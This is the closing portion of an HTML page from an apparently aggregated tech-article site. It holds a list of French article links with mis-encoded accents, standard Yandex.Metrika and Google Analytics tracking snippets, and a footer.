<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr432068/index.html">Comment faciliter l'√©tude de l'anglais: 5 services utiles</a></li>
<li><a href="../fr432070/index.html">En bref sur les cha√Ænes redux-saga</a></li>
<li><a href="../fr432072/index.html">Trois types de fuites de m√©moire</a></li>
<li><a href="../fr432074/index.html">Comment les joueurs d√©chirent le tissu de r√©alit√© Spelunky avec des fusils de chasse</a></li>
<li><a href="../fr432076/index.html">La fonction non reconnue ralentit le programme 5 fois</a></li>
<li><a href="../fr432080/index.html">Id√©es fausses des joueurs lors de l'√©valuation des risques. Contr√¥le du g√©n√©rateur de nombres al√©atoires en d√©veloppement</a></li>
<li><a href="../fr432082/index.html">Microsoft AI Chatbot lance une collection de v√™tements en Chine</a></li>
<li><a href="../fr432084/index.html">Comment nous avons organis√© une comp√©tition par √©quipes entre les travailleurs de la production (comme en URSS)</a></li>
<li><a href="../fr432086/index.html">Impression 3D √† l'√©cole internationale du nom de M.V. Lomonosov</a></li>
<li><a href="../fr432088/index.html">Haute disponibilit√© MySQL sur GitHub</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>